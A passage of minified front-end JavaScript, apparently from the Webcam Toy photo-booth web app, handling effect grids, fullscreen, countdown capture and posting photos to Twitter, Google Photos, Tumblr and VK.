                var e = (i - o - (i < 711 ? 85 : 92)) / 3,
                    A = u.isSquare ? e - 2 : e * t;
                if (A > a) {
                    A = a;
                    e = n;
                    s = true;
                }
                $(this)
                    .css({ "margin-left": u.isSquare ? r((e - 2 - e * t) / 2) : 0, width: r(e * t), height: r(e) })
                    .parent()
                    .stop(true, false)
                    .css({ "margin-left": 0, "margin-bottom": 0, width: r(A), height: r(e) });
            });
            if (l) {
                l.updateOrientation(t !== f);
            }
            $("#grid-view>div").css("margin-top", s ? Math.max(2, (i - o - n * 3 - 82) / 2) : "");
        } else {
            if (e / i > (A ? 1 : f)) {
                v.css({ width: A ? i - 2 : i * t, height: i, "margin-left": A ? (i - 2) / -2 : (i * t) / -2, "margin-top": i / -2 });
                w.css({ width: i * t, height: i, "margin-left": A ? (i - i * t - 2) / 2 : 0 });
            } else {
                v.css({ width: e, height: A ? e : e / t, "margin-left": e / -2, "margin-top": A ? e / -2 : e / t / -2 });
                w.css({ width: A ? e * t : e, height: A ? e : e / t, "margin-left": A ? (e - e * t) / 2 : 0 });
            }
            if (u) {
                u.updateOrientation(t !== f);
                We();
            }
        }
    }
    function Me() {
        if (c.isCapturing || c.isSharing || c.isGrid) {
            return;
        }
        u.previousEffect();
        Oe();
    }
    function Ge() {
        if (c.isCapturing || c.isSharing || c.isGrid) {
            return;
        }
        u.nextEffect();
        Oe();
    }
    function Ze() {
        if (c.isGrid && l) {
            l.previousPage();
            gA();
        }
    }
    function Ve() {
        if (c.isGrid && l) {
            l.nextPage();
            gA();
        }
    }
    function ze() {
        clearTimeout(i);
        cancelAnimationFrame(r);
    }
    function Ne() {
        if (c.isSharing) {
            return;
        }
        ze();
        if (h && h.play) {
            h.play();
        }
        qe();
    }
    function Pe() {
        if (c.isCapturing || c.isSharing) {
            return;
        }
        if (u) {
            u.useMirror(!u.isMirror);
            if (c.isGrid) {
                if (l) {
                    l.useMirror(u.isMirror);
                }
            } else {
                u.draw();
            }
        }
    }
    function je() {
        if (c.isCapturing || c.isSharing) {
            return;
        }
        if (u) {
            u.useSquare(!u.isSquare);
            if (c.isGrid) {
                if (l) {
                    l.useSquare(u.isSquare);
                }
            } else {
                u.draw();
            }
        }
        Qe();
    }
    function Ye() {
        if (c.isCapturing || c.isSharing || c.isGrid) {
            return;
        }
        c.useCountdown = !c.useCountdown;
    }
    function He() {
        if (c.isCapturing || c.isSharing || c.isGrid) {
            return;
        }
        c.useCameraFlash = !c.useCameraFlash;
    }
    function Xe() {
        var e,
            A,
            t = S.parent().eq(u.effectNum - l.page * l.effects.length);
        if (!t.length) {
            t = S.parent().eq(4);
        }
        if (!t.length) {
            return null;
        }
        e = p.offset();
        A = t.offset();
        return { left: A.left - e.left, top: A.top - e.top, width: t.width(), height: t.height() };
    }
    function _e() {
        if (!l) {
            Ne();
            return;
        }
        var A = Math.floor(u.effectNum / l.effects.length);
        if (c.isGrid) {
            ze();
            Qe();
            k.hide();
            p.removeClass("wait");
            Le(0, C, 0, null, true);
            setTimeout(function () {
                if (l) {
                    if (l.page !== A) {
                        l.setPage(A);
                    }
                    l.draw();
                }
                gA();
                if (a) {
                    b.show();
                } else {
                    Le(1, b, 0, null, true);
                }
                var e = Xe();
                if (!e) {
                    v.hide();
                    E.show();
                    return;
                }
                E.hide().css("opacity", 0);
                v.removeClass("toy-shadow").addClass("toy-zoom-out");
                w.addClass("toy-zoom-out");
                setTimeout(function () {
                    v.css({ width: e.width, height: e.height, "margin-left": e.left - p.width() / 2, "margin-top": e.top - p.height() / 2 });
                    w.css({ width: u.isSquare ? e.width * f : e.width, height: e.height, "margin-left": u.isSquare ? (e.width - e.width * f) / 2 : 0 });
                    Le(1, E, 210, null, true);
                    setTimeout(function () {
                        b.show();
                        v.removeClass("toy-zoom-out");
                        w.removeClass("toy-zoom-out");
                        Le(0, v, 0, null, true);
                        c.isZooming = false;
                        Ne();
                        if (!c.isGridLoaded) {
                            c.isGridLoaded = true;
                            M.hide();
                            $("#button-effects .more").show();
                        }
                    }, 410);
                }, 0);
            }, 10);
        } else {
            if (a) {
                ze();
            }
            if (l) {
                if (l.page !== A) {
                    l.setPage(A);
                }
                l.draw();
            }
            var e = Xe();
            if (!e) {
                C.show();
                v.show();
                E.hide();
                b.hide();
                Qe();
                Oe();
                return;
            }
            Qe();
            var t = { width: v.width(), height: v.height(), "margin-left": v.css("margin-left"), "margin-top": v.css("margin-top") };
            v.show().css({ opacity: 1, width: e.width, height: e.height, "margin-left": e.left - p.width() / 2, "margin-top": e.top - p.height() / 2 });
            w.css({ width: u.isSquare ? e.width * f : e.width, height: e.height, "margin-left": u.isSquare ? (e.width - e.width * f) / 2 : 0 });
            Le(0, E, 0, null, true);
            if (!a) {
                Le(0, b, 0, null, true);
            }
            setTimeout(function () {
                v.addClass("toy-zoom-in").css(t);
                w.addClass("toy-zoom-in").css({ width: u.isSquare ? t.width * f : t.width, height: t.height, "margin-left": u.isSquare ? (t.width - t.width * f - 2) / 2 : 0 });
                setTimeout(function () {
                    b.hide();
                    v.removeClass("toy-zoom-in").addClass("toy-shadow-fade toy-shadow");
                    w.removeClass("toy-zoom-in");
                    Qe();
                    Le(1, C, 0, null, true);
                    setTimeout(function () {
                        v.removeClass("toy-shadow-fade");
                        c.isZooming = false;
                        Ne();
                    }, 210);
                }, 310);
            }, 0);
            Oe();
        }
    }
    function $e() {
        if (c.isCapturing || c.isSharing || c.isZooming) {
            return;
        }
        c.isGrid = !c.isGrid;
        c.isZooming = true;
        o.log("Grid", c.isGrid ? "show" : "hide");
        if (c.isGridLoaded) {
            _e();
        } else {
            ze();
            p.addClass("wait");
            $("#button-effects p").hide();
            G.text("0%");
            M.show();
            setTimeout(function () {
                if (l) {
                    l.destroy();
                }
                var e = 9;
                if (a && !o.ua.isiOS) {
                    e = 6;
                    R.last().addClass("hidden");
                }
                l = new o.Grid(S, h, 320, Math.floor(320 / f), e);
                if (l) {
                    o.log("Grid init");
                    setTimeout(function () {
                        l.initPages(
                            l.totalPages,
                            function (e) {
                                G.text(Math.round(Math.max(0, Math.min(1, (l.totalPages - e) / l.totalPages)) * 90 + 10) + "%");
                            },
                            _e
                        );
                    }, 0);
                } else {
                    c.isGrid = false;
                    c.isZooming = false;
                    p.removeClass("wait");
                    M.hide();
                    $("#button-effects .more").show();
                    Oe();
                    Ne();
                }
            }, 0);
        }
    }
    function eA() {
        if (document.webkitExitFullscreen) {
            document.webkitExitFullscreen();
        } else if (document.webkitCancelFullScreen) {
            document.webkitCancelFullScreen();
        } else if (document.mozExitFullScreen) {
            document.mozExitFullScreen();
        } else if (document.mozCancelFullScreen) {
            document.mozCancelFullScreen();
        } else if (document.exitFullScreen) {
            document.exitFullScreen();
        } else if (document.exitFullscreen) {
            document.exitFullscreen();
        }
    }
    function AA() {
        var e = document.body;
        if (e.webkitRequestFullScreen) {
            e.webkitRequestFullScreen(Element.ALLOW_KEYBOARD_INPUT);
        } else if (e.mozRequestFullScreen) {
            e.mozRequestFullScreen();
        } else if (e.requestFullScreen) {
            e.requestFullScreen();
        } else if (e.requestFullscreen) {
            e.requestFullscreen();
        }
    }
    function tA() {
        return document.webkitIsFullScreen || document.mozFullScreen || document.webkitFullscreenElement || document.mozFullScreenElement || document.fullScreenElement || document.fullscreenElement;
    }
    function iA() {
        if (tA()) {
            eA();
        } else {
            AA();
        }
    }
    function rA() {
        return c.saveFilename + c.saveCount + ".jpg";
    }
    function sA() {
        setTimeout(function () {
            z.removeAttr("href");
        }, 50);
    }
    function oA() {
        c.isSharing = false;
        sA();
        o.log("Back");
        if (ke.is(":visible")) {
            Le(
                0,
                ke,
                0,
                function () {
                    ke.hide()[0].reset();
                },
                true
            );
        }
        Re.fadeOut(100, function () {
            Te.hide().css({ opacity: 1 }).removeClass("photo-bottom photo-tweet");
            Re.removeClass("rotate-two photo-drop photo-img-tweet photo-shadow").attr("src", "");
            Be.removeClass("show");
        });
        Le(
            0,
            $("#toy-share-ui"),
            0,
            function () {
                o.Services.cancelPost();
                bA();
                P.hide();
                Y.hide();
                X.hide();
                ee.hide();
                Ae.hide();
                CA();
                ue.hide();
                pe.hide();
                ve.hide();
                we.hide();
                se.hide();
                oe.hide();
                ae.hide();
                n = null;
            },
            true
        );
        Le(
            0,
            p,
            50,
            function () {
                try {
                    u.setEffect(u.id);
                } catch (e) {}
                Oe();
                Ne();
                w.show();
                v.show();
                y.css("opacity", 1);
                Le(1, p, 0, null, true);
                Le(1, C);
            },
            true
        );
    }
    function aA() {
        if (c.countdown) {
            var e = c.quadCountdown,
                A = 50,
                t = 50,
                i = u.id === "comicstrip" && !u.isSquare && !(a && f === it()),
                r = ((u.maxLength - u.minLength / 2) / u.maxLength) * 100;
            switch (e) {
                case 4:
                    t = i ? r / 2 : 25;
                    A = 25;
                    break;
                case 3:
                    t = i ? r + (100 - r) / 2 : 75;
                    A = 25;
                    break;
                case 2:
                    t = i ? (100 - r) / 2 : 25;
                    A = 75;
                    break;
                case 1:
                    t = i ? 100 - r / 2 : 75;
                    A = 75;
                    break;
            }
            if (e) {
                re.addClass("quad");
            } else {
                re.removeClass("quad");
            }
            re.css({ left: t + "%", top: A + "%", visibility: "visible" })
                .html(c.countdown--)
                .show()
                .delay(e ? 300 : 400)
                .fadeOut(e ? 75 : 100);
            o.Audio.playTrack("countdown");
            setTimeout(aA, e ? 650 : 800);
        } else {
            if (c.quadCountdown) {
                c.quadCountdown--;
            }
            uA();
        }
    }
    function nA() {
        c.isPhotoSaved = true;
        if (oe.is(":visible")) {
            oe.hide();
            se.show();
        }
    }
    function cA() {
        if (N.is(":visible")) {
            N.fadeOut(200);
        } else {
            N.hide();
        }
        if (j.is(":visible")) {
            j.fadeOut(200);
        } else {
            j.hide();
        }
        if (H.is(":visible")) {
            H.fadeOut(200);
        } else {
            H.hide();
        }
        if (_.is(":visible")) {
            _.fadeOut(200);
        } else {
            _.hide();
        }
    }
    function hA() {
        c.photoTextNum = Math.floor(Math.random() * De.length);
        c.photoCommentNum = Math.floor(Math.random() * Je.length);
        c.postAttempt = 0;
        c.isPhotoSaved = false;
        Le(1, $("#toy-share-ui"), 300);
    }
    function uA() {
        if (c.quadCountdown) {
            o.Audio.playTrack("capture", 100);
            if (c.useCameraFlash) {
                $("#camera-flash")
                    .show()
                    .delay(250)
                    .fadeOut(200, function () {
                        c.isCapturing = false;
                        lA();
                    });
            } else {
                setTimeout(function () {
                    c.isCapturing = false;
                    lA();
                }, 250);
            }
            return;
        }
        re.hide();
        switch (c.shareService) {
            case o.Services.ID.TWITTER:
                N.removeButtonClick().buttonClick(kA).removeClass("button-inactive").show();
                yA("post");
                vA("twitter-post");
                SA();
                BA();
                break;
            case o.Services.ID.GOOGLE:
                j.removeButtonClick().buttonClick(qA).removeClass("button-inactive").show();
                yA("post");
                vA("google-post");
                SA();
                break;
            case o.Services.ID.TUMBLR:
                H.removeButtonClick().buttonClick(ZA).removeClass("button-inactive").show();
                yA("post");
                vA("tumblr-post");
                SA();
                break;
            case o.Services.ID.VK:
                _.removeButtonClick().buttonClick(YA).removeClass("button-inactive").show();
                yA("post");
                vA("vk-post");
                SA();
                break;
            default:
                wA();
                yA("login");
                vA("disclaimer");
                break;
        }
        o.Audio.playTrack("capture", 100);
        if (c.useCameraFlash) {
            $("#camera-flash").show();
        }
        setTimeout(
            function () {
                ze();
                n = u.getImage();
                c.isCapturing = false;
                c.isSharing = true;
                if (c.useCameraFlash) {
                    $("#camera-flash").fadeOut(200, hA);
                } else {
                    hA();
                }
                C.hide();
                w.hide();
                v.hide();
                if (!c.useCameraFlash) {
                    p.hide().fadeIn(100);
                }
                if (n && u && Re) {
                    Re.attr({ src: n.src, width: u.width, height: u.height });
                }
                switch (u.id) {
                    case "cocoa":
                    case "danger":
                    case "retro":
                    case "rose":
                    case "xpro":
                    case "zinc":
                        Re.removeClass("photo-white photo-thick");
                        Re.addClass("photo-black photo-thin");
                        break;
                    case "disco":
                    case "fire":
                    case "lsd":
                    case "mono":
                    case "monoquad":
                    case "nightvision":
                        Re.removeClass("photo-white photo-thin");
                        Re.addClass("photo-black photo-thick");
                        break;
                    case "cocktail":
                    case "comicbook":
                    case "comicstrip":
                    case "envy":
                    case "hazydays":
                    case "magazine":
                    case "rainbow":
                        Re.removeClass("photo-black photo-thick");
                        Re.addClass("photo-white photo-thin");
                        break;
                    case "glaze":
                    case "watercolor":
                        Re.removeClass("photo-black photo-thick photo-thin");
                        break;
                    default:
                        Re.removeClass("photo-black photo-thin");
                        Re.addClass("photo-white photo-thick");
                }
            },
            c.useCameraFlash ? 250 : 0
        );
        setTimeout(function () {
            if (c.useCameraFlash) {
                Te.show();
            } else {
                Te.fadeIn(100);
            }
            Re.show().css("margin-top", -60);
            setTimeout(
                function () {
                    Be = $("#photo-ad");
                    if (c.shareService !== o.Services.ID.TWITTER) {
                        Re.addClass("rotate-two photo-drop");
                        Be.addClass("show");
                    } else {
                        Be.removeClass("show");
                    }
                    Re.css("margin-top", 0);
                    setTimeout(function () {
                        Re.addClass("photo-shadow");
                        o.trackEvent("Photo", "Capture", u.id);
                        o.log("Photo", "Capture", u.id);
                    }, 250);
                },
                c.useCameraFlash ? 100 : 0
            );
        }, 200);
    }
    function lA() {
        if (c.isCapturing || c.isSharing || c.isGrid) {
            return;
        }
        k.hide();
        Le(0, C, 0, null, true);
        if (c.quadCountdown) {
            u.quadPos = c.quadCountdown;
        }
        c.countdown = c.useCountdown ? 3 : 0;
        c.isCapturing = true;
        setTimeout(aA, c.countdown || u.isQuad ? 250 : 0);
    }
    function fA(e) {
        return $("#button-effects .effect-" + e).text();
    }
    function dA(e) {
        e = e.replace(/(^|[-\u2014\s(\["])'/g, "$1‘");
        e = e.replace(/'/g, "’");
        e = e.replace(/(^|[-\u2014\[(\u2018\s])"/g, "$1“");
        e = e.replace(/"/g, "”");
        e = e.replace(/<3/g, "❤️");
        e = e.replace(/\.\.\./g, "…");
        e = e.replace(/(:\)|:\-\)|\=\)|\(:)/g, "😊");
        e = e.replace(/:D|\=D|:3/g, "😁");
        e = e.replace(/;\)/g, "😉");
        e = e.replace(/(:\(|:\-\(|\=\()/g, "🙁");
        e = e.replace(/WE(B|D)? ?CA(M(E)?|N) ?TOY/g, "WEBCAM TOY");
        e = e.replace(/(W|w)(E|e)(b|d)? ?(C|c)(A|a)(m(e)?|n)/g, "$1ebcam");
        return e.substr(0, m);
    }
    function mA() {
        if (u.id === "normal") {
            return De[c.photoTextNum || 0];
        }
        var e = fA(u.id),
            A = e ? Je[c.photoCommentNum || 0].value.replace("%s", e) : "";
        return dA(A);
    }
    function gA() {
        if (l) {
            T.each(function (e) {
                $(this).text(fA(l.getEffectID(e)));
            });
            if (l.page === 13) {
                R.eq(1).addClass("hidden");
            } else {
                R.eq(1).removeClass("hidden");
            }
        }
    }
    function pA(e, A, t) {
        if (t.length === 3) {
            t = "";
        } else {
            t += ".";
        }
        e.text(A + t);
        s = setTimeout(pA, 400, e, A, t);
    }
    function xA() {
        Le(0, ce, 0, null, true);
    }
    function CA() {
        $("#toy-share-ui footer p").hide();
    }
    function vA(e) {
        CA();
        if (e) {
            $("#prompt-" + e).show();
        }
    }
    function bA() {
        clearTimeout(s);
        N.find("p").hide();
        j.find("p").hide();
        H.find("p").hide();
        _.find("p").hide();
    }
    function yA(e) {
        var A, t;
        bA();
        switch (c.shareService) {
            case o.Services.ID.TWITTER:
                A = N;
                t = P;
                break;
            case o.Services.ID.GOOGLE:
                A = j;
                t = Y;
                break;
            case o.Services.ID.TUMBLR:
                A = H;
                t = X;
                break;
            case o.Services.ID.VK:
                A = _;
                t = ee;
                break;
            default:
                $(".button .share-login").show();
                return;
        }
        if (e === "posted") {
            A.hide();
            t.show();
        } else {
            t.hide();
            A.show();
            if (e) {
                A.find(".share-" + e).show();
            }
        }
    }
    function wA() {
        $(he.hide()[Math.floor(Math.random() * he.length)]).show();
    }
    function EA() {
        c.shareService = "";
        c.postAttempt = 0;
        N.fadeOut(200);
        P.fadeOut(200);
        j.fadeOut(200);
        Y.fadeOut(200);
        H.fadeOut(200);
        X.fadeOut(200);
        _.fadeOut(200);
        ee.fadeOut(200);
        Ae.fadeOut(200);
        ue.fadeOut(100);
        pe.fadeOut(100);
        ve.fadeOut(100);
        we.fadeOut(100);
        CA();
        Le(
            0,
            ne,
            0,
            function () {
                bA();
                N.removeClass("share-center button-inactive").addClass("share").removeButtonClick().delay(250).fadeIn(400).buttonClick(JA);
                j.removeClass("share-center button-inactive").addClass("share").removeButtonClick().delay(250).fadeIn(400).buttonClick(QA);
                H.removeClass("share-center button-inactive").addClass("share").removeButtonClick().delay(250).fadeIn(400).buttonClick(NA);
                _.removeClass("share-center button-inactive").addClass("share").removeButtonClick().delay(250).fadeIn(400).buttonClick(_A);
                wA();
                yA("login");
                vA("disclaimer");
                Le(1, ne, 250, null, true);
                Le(1, ce, 250, null, true);
            },
            true
        );
    }
    function SA() {
        Ae.removeClass("button-inactive").addClass("active").show();
    }
    function TA(e) {
        if (e && typeof e === "object") {
            e = e.statusText || JSON.stringify(e);
        }
        if (/blacklist/i.test(e)) {
            o.Services.twitterLogout();
            EA();
            return;
        }
        if (c.postAttempt < 2) {
            c.postAttempt++;
        } else {
            if (/oauth/i.test(e)) {
                o.Services.twitterLogout();
                EA();
                return;
            } else {
                vA("twitter-error");
            }
        }
        yA("error");
        SA();
        N.removeClass("button-inactive").buttonClick(kA);
        Ie.disabled = false;
        o.error("Twitter post error" + (e ? ": " + e : ""));
    }
    function RA(e) {
        yA("posted");
        vA("twitter-posted");
        SA();
        if (e) {
            $("a.twitter").attr("href", e);
        }
        o.trackEvent("Photo", "Twitter", u.id);
        o.log("Photo", "Twitter", u.id);
        c.postAttempt = 0;
        nA();
    }
    function kA() {
        Ie.blur();
        Ie.disabled = true;
        yA("posting");
        CA();
        N.removeButtonClick().addClass("button-inactive");
        Ae.removeClass("active").addClass("button-inactive");
        pA(fe, ge, "...");
        o.log("Photo", "Twitter post", u.id);
        o.Services.twitterPost({ image: n, message: dA(Ue.val()) || mA() }, RA, TA);
    }
    function UA() {
        if (c.shareService === o.Services.ID.TWITTER) {
            return;
        }
        c.shareService = o.Services.ID.TWITTER;
        xA();
        CA();
        cA();
        Le(
            0,
            ne,
            0,
            function () {
                yA("post");
                N.hide().delay(250).fadeIn(400);
                vA("twitter-post");
                N.removeClass("share").addClass("share-center");
                Ae.removeClass("google tumblr vk button-inactive").addClass("twitter active").delay(250).fadeIn(400);
                if (ne.data("hover")) {
                    Le(1, ne, 250, null, true);
                }
                BA();
            },
            true
        );
    }
    function IA() {
        var e = dA(Ue.val());
        if (Ue.val() !== e) {
            var A = Ie.selectionStart + e.length - Ue.val().length + 1;
            Ie.focus();
            Ue.val("");
            Ue.val(e);
            if (Ie.setSelectionRange && A) {
                Ie.setSelectionRange(A, A);
            }
        }
        var t = m - e.length;
        Fe.text(t)
            .removeClass("short long blur")
            .addClass(Ue.is(":focus") ? (t < 20 ? "short" : "long") : "blur");
    }
    function DA() {
        if (ke.is(":visible")) {
            Le(
                0,
                ke,
                100,
                function () {
                    Re.addClass("rotate-two");
                    Te.removeClass("photo-bottom");
                    Ie.blur();
                    Ue.val("");
                },
                true
            );
        }
    }
    function BA() {
        Re.removeClass("rotate-two photo-drop").addClass("photo-img-tweet");
        Te.addClass("photo-bottom photo-tweet");
        Be.removeClass("show");
        Ue.attr("placeholder", mA());
        Ie.disabled = false;
        ke.css("opacity", 0);
        Le(
            1,
            ke,
            100,
            function () {
                Ie.focus();
                IA();
            },
            true
        );
        N.removeButtonClick().buttonClick(kA);
    }
    function FA(e) {
        if (e) {
            le.text(me.replace("@", "@" + e));
            ue.text(de.replace("@", "@" + e));
            if (c.isSharing) {
                UA();
            }
        }
    }
    function JA() {
        o.Services.onTwitterAuth = FA;
        o.Services.twitterAuth();
    }
    function LA(e) {
        if (e && typeof e === "object") {
            e = e.statusText || JSON.stringify(e);
        }
        if (c.postAttempt < 2) {
            c.postAttempt++;
        } else {
            if (/oauth/i.test(e)) {
                o.Services.googleLogout();
                EA();
                return;
            } else {
                vA("google-error");
            }
        }
        yA("error");
        SA();
        j.removeClass("button-inactive").buttonClick(qA);
        o.error("Google Photos post error" + (e ? ": " + e : ""));
    }
    function KA(e) {
        yA("posted");
        vA("google-posted");
        SA();
        if (e) {
            $("a.google").attr("href", e);
        }
        o.trackEvent("Photo", "Google Photos", u.id);
        o.log("Photo", "Google Photos", u.id);
        c.postAttempt = 0;
        nA();
    }
    function qA() {
        yA("posting");
        CA();
        j.removeButtonClick().addClass("button-inactive");
        Ae.removeClass("active").addClass("button-inactive");
        pA(xe, Ce, "...");
        o.log("Photo", "Google Photos post", u.id);
        o.Services.googlePost({ image: n, message: mA() }, KA, LA);
    }
    function WA() {
        if (c.shareService === o.Services.ID.GOOGLE) {
            return;
        }
        c.shareService = o.Services.ID.GOOGLE;
        xA();
        CA();
        cA();
        Le(
            0,
            ne,
            0,
            function () {
                yA("post");
                j.hide().delay(250).fadeIn(400);
                vA("google-post");
                j.removeClass("share").addClass("share-center");
                Ae.removeClass("twitter tumblr vk button-inactive").addClass("google active").delay(250).fadeIn(400);
                if (ne.data("hover")) {
                    Le(1, ne, 250, null, true);
                }
                j.removeButtonClick().buttonClick(qA);
            },
            true
        );
    }
    function OA(e) {
        if (e && c.isSharing) {
            WA();
        }
    }
    function QA() {
        o.Services.onGoogleAuth = OA;
        o.Services.googleAuth();
    }
    function MA(e) {
        if (e && typeof e === "object") {
            e = e.statusText || JSON.stringify(e);
        }
        if (c.postAttempt < 2) {
            c.postAttempt++;
        } else {
            if (/oauth/i.test(e)) {
                o.Services.tumblrLogout();
                EA();
                return;
            } else {
                vA("tumblr-error");
            }
        }
        yA("error");
        SA();
        H.removeClass("button-inactive").buttonClick(ZA);
        o.error("Tumblr post error" + (e ? ": " + e : ""));
    }
    function GA(e) {
        yA("posted");
        vA("tumblr-posted");
        SA();
        if (e) {
            $("a.tumblr").attr("href", e);
        }
        o.trackEvent("Photo", "Tumblr", u.id);
        o.log("Photo", "Tumblr", u.id);
        c.postAttempt = 0;
        nA();
    }
    function ZA() {
        yA("posting");
        CA();
        H.removeButtonClick().addClass("button-inactive");
        Ae.removeClass("active").addClass("button-inactive");
        pA(be, ye, "...");
        o.log("Photo", "Tumblr post", u.id);
        o.Services.tumblrPost({ image: n, message: mA(), effect: u.id }, GA, MA);
    }
    function VA() {
        if (c.shareService === o.Services.ID.TUMBLR) {
            return;
        }
        c.shareService = o.Services.ID.TUMBLR;
        xA();
        CA();
        cA();
        Le(
            0,
            ne,
            0,
            function () {
                yA("post");
                H.hide().delay(250).fadeIn(400);
                vA("tumblr-post");
                H.removeClass("share").addClass("share-center");
                Ae.removeClass("twitter google vk button-inactive").addClass("tumblr active").delay(250).fadeIn(400);
                if (ne.data("hover")) {
                    Le(1, ne, 250, null, true);
                }
                H.removeButtonClick().buttonClick(ZA);
            },
            true
        );
    }
    function zA(e) {
        if (e && c.isSharing) {
            VA();
        }
    }
    function NA() {
        o.Services.onTumblrAuth = zA;
        o.Services.tumblrAuth();
    }
    function PA(e) {
        var A = "",
            t = "";
        if (e && e.error) {
            A = e.error.message;
            t = e.error.type;
        } else {
            A = e;
        }
        if (c.postAttempt < 2) {
            c.postAttempt++;
        } else {
            if (/oauth/i.test(t) || /oauth/i.test(A)) {
                o.Services.vkLogout();
                EA();
                return;
            } else {
                vA("vk-error");
            }
        }
        yA("error");
        SA();
        _.removeClass("button-inactive").buttonClick(YA);
        o.error("VK post error" + (t ? ": " + t : "") + (A ? ": " + A : ""));
    }
    function jA(e) {
        yA("posted");
        vA("vk-posted");
        SA();
        if (e) {
            $("a.vk").attr("href", e);
        }
        o.trackEvent("Photo", "VK", u.id);
        o.log("Photo", "VK", u.id);
        c.postAttempt = 0;
        nA();
    }
    function YA() {
        yA("posting");
        CA();
        _.removeButtonClick().addClass("button-inactive");
        Ae.removeClass("active").addClass("button-inactive");
        pA(Ee, Se, "...");
        o.log("Photo", "VK post", u.id);
        o.Services.vkPost({ image: n, message: mA() }, jA, PA);
    }
    function HA() {
        if (c.shareService === o.Services.ID.VK) {
            return;
        }
        c.shareService = o.Services.ID.VK;
        xA();
        CA();
        cA();
        Le(
            0,
            ne,
            0,
            function () {
                yA("post");
                _.hide().delay(250).fadeIn(400);
                vA("vk-post");
                _.removeClass("share").addClass("share-center");
                Ae.removeClass("twitter google tumblr button-inactive").addClass("vk active").delay(250).fadeIn(400);
                if (ne.data("hover")) {
                    Le(1, ne, 250, null, true);
                }
                _.removeButtonClick().buttonClick(YA);
            },
            true
        );
    }
    function XA(e) {
        if (e && c.isSharing) {
            HA();
        }
    }
    function _A() {
        o.Services.onVKAuth = XA;
        o.Services.vkAuth();
    }
    function $A(e) {
        if (e.css("opacity") === "0") {
            e.css("opacity", "");
        }
    }
    function et(e) {
        ze();
        o.Camera.getCamera(
            function (e, A, t) {
                if (t) {
                    o.error(t, A);
                    return;
                }
                Ne();
                var i = A || "";
                o.trackEvent("Capabilities", "Camera", i, true);
                o.log("Camera changed", i);
            },
            function (e, A) {
                o.error(e, A);
            },
            parseInt($(e.target).data("number"), 10)
        );
    }
    function At() {
        K.buttonClick(Me);
        q.buttonClick(Ge);
        w.click(function () {
            k.hide();
        });
        W.buttonClick(Ze);
        O.buttonClick(Ve);
        Q.buttonClick($e);
        Z.buttonClick(lA);
        L.buttonClick(function () {
            k.toggle();
            U.css("margin-left", 25 - U.width() / 2);
        });
        V.buttonClick(oA);
        if (!a) {
            V.hover(
                function () {
                    var e = c.isPhotoSaved ? se : oe;
                    if (e) {
                        $A(e);
                        e.stop(true, true).fadeIn(150);
                    }
                },
                function () {
                    var e = c.isPhotoSaved ? se : oe;
                    if (e) {
                        e.stop(true, true).delay(100).fadeOut(150);
                    }
                }
            );
        }
        N.buttonClick(JA);
        j.buttonClick(QA);
        H.buttonClick(NA);
        _.buttonClick(_A);
        $(".button.share,.button.share-center").hover(
            function () {
                $A(ne);
                ne.data("hover", true).stop(true, true).fadeIn(150);
            },
            function () {
                ne.data("hover", false).stop(true, true).delay(50).fadeOut(150);
            }
        );
        Ae.buttonClick(function () {
            if (Ae.hasClass("active")) {
                switch (c.shareService) {
                    case o.Services.ID.TWITTER:
                        o.Services.onTwitterAuth = null;
                        o.Services.twitterLogout();
                        DA();
                        break;
                    case o.Services.ID.GOOGLE:
                        o.Services.onGoogleAuth = null;
                        o.Services.googleLogout();
                        break;
                    case o.Services.ID.TUMBLR:
                        o.Services.onTumblrAuth = null;
                        o.Services.tumblrLogout();
                        break;
                    case o.Services.ID.VK:
                        o.Services.onVKAuth = null;
                        o.Services.vkLogout();
                        break;
                }
                EA();
            }
        }).hover(
            function () {
                if (Ae.hasClass("active")) {
                    var e;
                    switch (c.shareService) {
                        case o.Services.ID.TWITTER:
                            e = ue;
                            break;
                        case o.Services.ID.GOOGLE:
                            e = pe;
                            break;
                        case o.Services.ID.TUMBLR:
                            e = ve;
                            break;
                        case o.Services.ID.VK:
                            e = we;
                            break;
                    }
                    if (e) {
                        e.stop(true, true).fadeIn(150, function () {
                            e.css("opacity", 1);
                        });
                    }
                }
            },
            function () {
                if (Ae.hasClass("active")) {
                    var e;
                    switch (c.shareService) {
                        case o.Services.ID.TWITTER:
                            e = ue;
                            break;
                        case o.Services.ID.GOOGLE:
                            e = pe;
                            break;
                        case o.Services.ID.TUMBLR:
                            e = ve;
                            break;
                        case o.Services.ID.VK:
                            e = we;
                            break;
                    }
                    if (e) {
                        e.stop(true, true).delay(50).fadeOut(150);
                    }
                }
            }
        );
        ke.submit(function (e) {
            if (e) {
                e.preventDefault();
            }
        });
        vA("disclaimer");
        var e = o.Camera.cameras.length;
        if (e > 1) {
            var A = $("#settings fieldset");
            for (var t = 0; t < e; t++) {
                var i = "setting-camera" + t;
                var r = o.Camera.cameras[t].label.replace(/ \(.*\)/g, "");
                if (/front/.test(r)) {
                    r = "Front Camera";
                } else if (/facing back/.test(r)) {
                    r = "Back Camera";
                }
                A.prepend('<div><div class="checkbox hot-pink"></div><input type="radio" name="settings-camera" id="' + i + '" value="camera" data-number="' + t + '"><label for="' + i + '">' + r + "</label></div>");
                $("#" + i).click(et);
            }
            var s = $("#setting-camera" + o.Camera.number)[0];
            if (s) {
                s.checked = true;
            }
        }
        I.click(Pe);
        B.click(Ye);
        F.click(He);
        if (a) {
            D.parent().remove();
            J.parent().remove();
        } else {
            D.click(je);
            J.click(iA);
        }
        S.parent().each(function (A) {
            $(this)
                .on("mousedown touchstart", function (e) {
                    var A = it(),
                        t = 0.94,
                        i = $(this).find("canvas"),
                        r = parseFloat(i.css("height")),
                        s = u.isSquare ? r : parseFloat(i.css("width")),
                        o = Math.floor;
                    $(this)
                        .data("pressed", true)
                        .css({ width: s - (u.isSquare ? 2 : 0), height: r })
                        .animate({ "margin-left": o((s - (s - (u.isSquare ? 2 : 0)) * t) / 2), "margin-bottom": o((r - r * t) / 2), width: (s - (u.isSquare ? 2 : 0)) * t, height: r * t }, 100, "easeOutQuad");
                    i.css({ width: r * A, height: r }).animate({ "margin-left": u.isSquare ? o(((r - r * A) * t) / 2) : 0, width: r * A * t, height: r * t }, 100, "easeOutQuad");
                })
                .on("mouseup touchend", function (e) {
                    if ($(this).data("pressed")) {
                        e.stopPropagation();
                        $(this).data("pressed", false);
                        if (u && l) {
                            try {
                                u.setEffect(l.getEffectID(A));
                            } catch (e) {}
                        }
                        if (c.isZooming) {
                            Qe();
                        } else {
                            $e();
                        }
                    } else {
                        Qe();
                    }
                })
                .on("mouseout touchcancel", function () {
                    if ($(this).data("pressed")) {
                        $(this).data("pressed", false);
                        Qe();
                    }
                });
            this.onselectstart = function (e) {
                if (e) {
